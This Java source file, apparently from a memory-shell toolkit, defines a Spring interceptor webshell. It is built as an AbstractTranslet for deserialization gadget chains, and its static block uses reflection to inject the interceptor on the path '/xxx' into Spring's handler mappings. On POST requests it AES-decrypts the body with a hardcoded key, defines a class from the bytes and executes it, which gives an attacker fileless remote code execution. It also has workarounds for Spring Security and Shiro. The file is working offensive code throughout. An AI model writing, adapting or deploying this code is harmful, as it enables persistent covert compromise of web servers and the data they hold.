package org.memshell.template;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.springframework.context.ConfigurableApplicationContext;
import org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestWrapper;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.handler.MappedInterceptor;
import sun.misc.BASE64Decoder;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletRequestWrapper;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.List;

public class SpringInterceptorTemplate extends AbstractTranslet implements HandlerInterceptor {

    public SpringInterceptorTemplate() {
    }

    public void transform(DOM var1, SerializationHandler[] var2) throws TransletException {
    }

    public void transform(DOM var1, DTMAxisIterator var2, SerializationHandler var3) throws TransletException {
    }

    public boolean preHandle(HttpServletRequest req1, HttpServletResponse resp, Object var3) throws Exception {
        HttpServletRequest request = req1;
        // 兼容springboot + springSecurity
        if (req1.getClass().getName().contains("Servlet3SecurityContextHolderAwareRequestWrapper")) {
            SecurityContextHolderAwareRequestWrapper securityContextHolderAwareRequestWrapper = (SecurityContextHolderAwareRequestWrapper) req1;
            HttpServletRequestWrapper httpServletRequestWrapper = (HttpServletRequestWrapper) securityContextHolderAwareRequestWrapper.getRequest();
            HttpServletRequestWrapper httpServletRequestWrapper1 = (HttpServletRequestWrapper) httpServletRequestWrapper.getRequest();
            request = (HttpServletRequest) httpServletRequestWrapper1.getRequest();
        }

        // 兼容Springboot + shiro
        if (req1.getClass().getName().contains("ShiroHttpServletRequest")) {
            request = (HttpServletRequest) ((HttpServletRequestWrapper) req1).getRequest();
        }

        if (request.getMethod().equals("POST")) {
            Field var4 = ((RequestFacade) request).getClass().getDeclaredField("request");
            var4.setAccessible(true);
            Request var5 = (Request) var4.get(request);
            Response var6 = var5.getResponse();
            HttpSession var7 = var5.getSession();
            HashMap var8 = new HashMap();
            var8.put("request", var5);
            var8.put("response", var6);
            var8.put("session", var7);
            String var9 = "47bce5c74f589f48";
            var7.putValue("u", var9);
            Cipher var10 = Cipher.getInstance("AES");
            var10.init(2, new SecretKeySpec(var9.getBytes(), "AES"));
            ClassLoader var11 = Thread.currentThread().getContextClassLoader();
            Class var12 = Class.forName("java.lang.ClassLoader");
            Method var13 = var12.getDeclaredMethod("defineClass", String.class, byte[].class, Integer.TYPE, Integer.TYPE);
            var13.setAccessible(true);
            byte[] var14 = var10.doFinal((new BASE64Decoder()).decodeBuffer(var5.getReader().readLine()));
            Class var15 = (Class) var13.invoke(var11, null, var14, 0, var14.length);
            var15.newInstance().equals(var8);
            return false;
        } else {
            return true;
        }
    }

    static {
        try {
            Field applicationContextsField = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
            applicationContextsField.setAccessible(true);
            LinkedHashSet<ConfigurableApplicationContext> hashSet = (LinkedHashSet<ConfigurableApplicationContext>) applicationContextsField.get(null);
            WebApplicationContext webApplicationContext;
            Iterator<ConfigurableApplicationContext> iterator = hashSet.iterator();
            while (iterator.hasNext()) {
                ConfigurableApplicationContext configurableApplicationContext = iterator.next();
                if (configurableApplicationContext instanceof WebApplicationContext) {
                    webApplicationContext = (WebApplicationContext) configurableApplicationContext;
                    AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping) webApplicationContext.getBean("requestMappingHandlerMapping");
                    Field adaptedInterceptorsField = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
                    adaptedInterceptorsField.setAccessible(true);
                    List adaptedInterceptors = (List) adaptedInterceptorsField.get(abstractHandlerMapping);
                    adaptedInterceptors.add(0, new MappedInterceptor(new String[]{"/xxx"}, (String[]) null, new SpringInterceptorTemplate()));
                    adaptedInterceptorsField.set(abstractHandlerMapping, adaptedInterceptors);

                    Object resourceHandlerMapping = webApplicationContext.getBean("resourceHandlerMapping");
                    if (!resourceHandlerMapping.toString().equals("null")) {
                        AbstractHandlerMapping abstractHandlerMapping1 = (AbstractHandlerMapping) resourceHandlerMapping;
                        List o = (List) adaptedInterceptorsField.get(abstractHandlerMapping1);
                        o.add(0, new MappedInterceptor(new String[]{"/xxx"}, (String[]) null, new SpringInterceptorTemplate()));
                        adaptedInterceptorsField.set(abstractHandlerMapping1, o);
                    }
                }
            }
        } catch (Exception var8) {
            var8.printStackTrace();
        }
    }
}
